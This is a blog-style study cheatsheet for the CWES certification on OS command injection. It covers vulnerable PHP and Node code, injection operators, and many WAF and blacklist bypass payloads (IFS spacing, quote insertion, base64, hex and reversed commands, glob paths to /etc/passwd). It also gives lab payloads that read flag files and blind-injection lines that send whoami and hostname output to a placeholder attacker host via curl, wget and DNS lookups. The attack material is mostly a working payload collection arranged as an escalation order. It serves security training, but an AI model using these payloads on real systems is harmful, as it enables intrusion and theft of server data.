---
title: "CWES Cheatsheet — Command Injection"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, command-injection, rce]
---

command injection lets you run OS commands through a vulnerable application. it comes down to understanding how filters work, and how to get around them.

---

## common types of injections

| Injection | Description |
|---|---|
| OS Command Injection | occurs when user input is directly used as part of an OS command |
| Code Injection | occurs when user input is directly within a function that evaluates code |
| SQL Injections | occurs when user input is directly used as part of an SQL query |
| Cross-Site Scripting/HTML Injection | occurs when exact user input is displayed on a web page |

there are many other types of injections:

- `LDAP injection`
- `NoSQL Injection`
- `HTTP Header Injection`
- `XPath Injection`
- `IMAP Injection`
- `ORM Injection`

common operators used for injections:

| Injection Type | Operators |
|---|---|
| SQL Injection | `'` `,` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `\|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `\|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory Traversal/File Path Traversal | `../` `..\` `%00` |
| Object Injection | `;` `&` `\|` |
| XQuery Injection | `'` `;` `--` `/* */` |
| Shellcode Injection | `\x` `\u` `%u` `%n` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |

---

## vulnerable code examples

**php example** of executing a command directly on the back-end server:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

risky functions: `exec`, `system`, `shell_exec`, `passthru`, `popen`

**javascript on nodejs** example:

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

risky functions: `child_process.exec`, `child_process.spawn`

---

## bypassing front-end validation

intercept and modify the HTTP request before it reaches the server. use Burp Suite to catch the request and change parameter values after client-side validation runs.

---

## command injection methods

### php code blacklist characters

a basic character blacklist filter in php:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### identify filters

if you try operators like `;`, `&&`, `||` and get an `invalid input` error, it indicates the web application either detected a blacklisted character or detected a blacklisted command, or both.

if the error message displayed a different page with information like your IP and your request, this may indicate it was denied by a WAF.

---

## injection command operators

to inject an additional command to the intended one, use any of the following operators:

(`\n` = %0a, `&` = %26, `|` = %7c)

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `\|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | `` ` ` `` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |

if you are injecting in a PHP web application running on a Linux server, or a .Net application running on a Windows back-end server, or a NodeJS application running on a macOS back-end server, your injections should work regardless.

the only exception may be the semi-colon `;`, which will not work if the command was being executed with Windows Command Line (CMD), but would still work if it was being executed with Windows PowerShell.

---

## bypass blacklist command

a basic command blacklist filter in php:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

### obfuscated commands

list of commands obfuscated as wordlist to test possible WAF filter bypass:

```bash
uname
u'n'a'm'e
${uname}
$(uname)
{uname}
$(rev<<<'emanu')
bash<<<$(base64 -d<<<dW5hbWUgLWE=)
b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)
l's'${IFS}${PATH:0:1}${IFS}-a'l'
```

### linux only

```bash
\
$@

who$@ami
w\ho\am\i
```

---

## linux

### filtered character bypass

**bypass without space**

| Code | Description |
|---|---|
| `printenv` | can be used to view all environment variables |
| **Spaces** | |
| `%09` | using tabs instead of spaces |
| `${IFS}` | will be replaced with a space and a tab. cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}` | commas will be replaced with spaces |
| `$IFS$9` | `$9` is empty, acts as separator so `$IFS` is parsed correctly |
| `<` | input redirection can replace space (e.g. `cat</etc/passwd`) |
| `%20` | URL-encoded space |
| `+` | plus sign (works in URL/web contexts) |
| **Other Characters** | |
| `${PATH:0:1}` | will be replaced with forward slash `/` |
| `${LS_COLORS:10:1}` | will be replaced with `;` |
| `echo $(tr '!-}' '"-~'<<<[)` | shift character by one to produce back slash (`[` -> `\`) |
| `echo $(tr '!-}' '"-~'<<<:)` | character shifting by one to give a semicolon (`:` -> `;`) |
| `${HOME:0:1}` | will be replaced with `/` (alternative) |
| `$(printf '\57')` | produces `/` from octal |
| `$(printf '\073')` | produces `;` from octal |
| `${SHELLOPTS:3:1}` | produces `:` in Bash |

### bypassing space filters

- encoded newline `\n` is URL encoded value = `%0a`
- bypass blacklisted spaces: `127.0.0.1%0a whoami`
- using tabs: `127.0.0.1%0a%09`
- using $IFS: `127.0.0.1%0a${IFS}`
- using brace expansion: `127.0.0.1%0a{ls,-la}`

linux command injection to list the contents of the `/home` folder on target and bypass the WAF filter:

```bash
127.0.0.1%0als${IFS}${PATH:0:1}home
```

### blacklisted command bypass

| Code | Description |
|---|---|
| **Character Insertion** | |
| `'` or `"` | total must be even |
| `$@` or `\` | linux only |
| `w'h'o'am'i` | single quotes (even number) |
| `w"h"o"am"i` | double quotes (even number) |
| `who$@ami` | empty variable insertion |
| `w\ho\am\i` | backslash insertion |
| `w${u}h${u}o${u}a${u}m${u}i` | uninitialized variable (expands to empty) |
| **Case Manipulation** | |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | execute command regardless of cases (Bash & Zsh) |
| `$(a="WhOaMi";printf %s "${a,,}")` | another variation (Bash only) |
| `a="WhOaMi"; ${a:l}` | Zsh equivalent (Zsh only) |
| **Reversed Commands** | |
| `echo 'whoami' \| rev` | reverse a string |
| `$(rev<<<'imaohw')` | execute reversed command |
| **Encoded Commands** | |
| `echo -n 'cat /etc/passwd \| grep 33'` | show the original command |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | execute b64 encoded string |

> we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

### bypass blacklist commands - examples

```bash
127.0.0.1%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}

# example 2:
%3bc'a't${IFS}${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt;

# interpretation: ;cat /../../../../flag.txt;
```

### advanced command obfuscation

you can convert the string from utf-8 to utf-16 before base64 encoding:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# output: dwBoAG8AYQBtAGkA

bash<<<$(base64 -d<<<dwBoAG8AYQBtAGkA)
```

### hex encoding

```bash
echo whoami | xxd -p
# output: 77686f616d690a

$(xxd -r -p<<<77686f616d69)
```

### octal encoding

```bash
$(printf '\167\150\157\141\155\151')
# executes: whoami
```

### wildcard and glob bypass

```bash
# when exact command/path names are blocked, use ? and *
/???/??t /???/??????       # /bin/cat /etc/passwd
/???/??t /???/??ss??       # /bin/cat /etc/passwd
/bin/ca? /etc/passw?       # single char wildcard
/bin/c*t /etc/pas*         # multi char wildcard
echo /etc/pas*             # list matching files
```

### file read alternatives (when `cat` is blocked)

| Command | Description |
|---|---|
| `tac` | print in reverse line order |
| `less` / `more` | pager |
| `head` / `tail` | first/last lines |
| `nl` | number lines and print |
| `sort` | sort and print |
| `strings` | extract printable strings |
| `xxd` / `od -c` | hex/octal dump |
| `dd if=/etc/passwd` | copy and print |
| `cp /etc/passwd /dev/stdout` | copy to stdout |
| `paste /etc/passwd` | single file = cat |
| `diff /etc/passwd /dev/null` | shows content in diff format |
| `rev /etc/passwd \| rev` | double reverse = original |

### directory listing alternatives (when `ls` is blocked)

| Command | Description |
|---|---|
| `dir` | alternative to ls |
| `find .` | recursive listing |
| `echo *` | glob expansion |
| `printf '%s\n' *` | print each file |

---

## windows

### filtered character bypass

| Code | Description |
|---|---|
| `Get-ChildItem Env:` | can be used to view all environment variables (PowerShell) |
| **Spaces** | |
| `%09` | using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | will be replaced with a space (CMD) |
| `$env:PROGRAMFILES[10]` | will be replaced with a space (PowerShell) |
| **Other Characters** | |
| `%HOMEPATH:~0,-17%` | will be replaced with `\` (CMD) |
| `$env:HOMEPATH[0]` | will be replaced with `\` (PowerShell) |

### blacklisted command bypass

| Code | Description |
|---|---|
| **Character Insertion** | |
| `'` or `"` | total must be even |
| `^` | windows only (CMD) |
| **Case Manipulation** | |
| `WhoAmi` | simply send the character with odd cases |
| **Reversed Commands** | |
| `"whoami"[-1..-20] -join ''` | reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | execute reversed command |
| **Encoded Commands** | |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | encode a string with base64 |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | execute b64 encoded string |

in windows, using `~` to set starting character position in string and minus the length can produce slash character: `echo %HOMEPATH:~6,-11%`

### windows only

```bash
who^ami
w'h'o'am'i
```

---

## bypass WAF with double encoding

| Code | Description |
|---|---|
| `%2527` | double encoded `'` |
| `%253b` | double encoded `;` |
| `%250a` | double encoded newline |
| `%2524` | double encoded `$` |

useful when WAF decodes once but the app decodes twice.

---

## bashfuscator

linux bash automated obfuscation tool:

```bash
cd /home/kali/Downloads/htb/academy/command/Bashfuscator/bashfuscator/bin/

bashfuscator -h

./bashfuscator -c 'cat /etc/passwd'
```

the output from the bash obfuscator tool is `eval "$(rev <<<'dwssap/cte/ tac')"`:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

### DOSfuscation

windows automated obfuscation tool:

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
```

reference: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

---

## blind command injection (no output)

```bash
# time-based detection
127.0.0.1%0asleep${IFS}5

# OOB via curl/wget (if outbound allowed)
127.0.0.1%0acurl${IFS}http://YOUR_IP:PORT/$(whoami)
127.0.0.1%0awget${IFS}http://YOUR_IP:PORT/$(cat${IFS}/etc/hostname)

# DNS exfiltration
127.0.0.1%0anslookup${IFS}$(whoami).YOUR_DOMAIN

# write to webroot then browse to it
127.0.0.1%0awhoami${IFS}>${IFS}/var/www/html/out.txt
```

### common injection points to test

| Location | Example |
|---|---|
| URL parameters | `?ip=127.0.0.1;whoami` |
| POST body | `ip=127.0.0.1%0awhoami` |
| HTTP Headers | `X-Forwarded-For: ;whoami` |
| User-Agent | `User-Agent: ;whoami` |
| Cookie values | `cookie=;whoami` |
| File names | upload file named `test;whoami.png` |
| JSON values | `{"ip":"127.0.0.1\nwhoami"}` |

---

## OS command injection exercises

use what you learned in bypassing other blacklisted characters section to find name of the user in the `/home` folder:

```
ip=127.0.0.1%0al's'${IFS}-al${IFS}${PATH:0:1}home
```

use what you learned in bypassing blacklisted commands section to find the content of flag.txt in the home folder of the user you previously found:

```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

find the output of the following command using one of the techniques learned: `find /usr/share/ | grep root | grep mysql | tail -n 1`

base64 encode the find command:

```bash
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64 -w 0;echo
```

command injection payload bypassing WAF:

```
ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

---

## quick payload escalation order

```bash
# 1. basic operators
; whoami  |  | whoami  |  || whoami  |  & whoami  |  && whoami  |  `whoami`  |  $(whoami)

# 2. if all blocked -> newline
%0awhoami

# 3. if space blocked -> add IFS
%0a${IFS}whoami

# 4. if command blocked -> char insertion
%0a${IFS}w'h'o'am'i

# 5. if still blocked -> base64
%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)

# 6. if bash blocked -> reverse it too
%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<d2hvYW1p)

# 7. if no output -> go blind (time or OOB)
%0asleep${IFS}5
%0acurl${IFS}http://YOUR_IP/$(whoami)
```

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
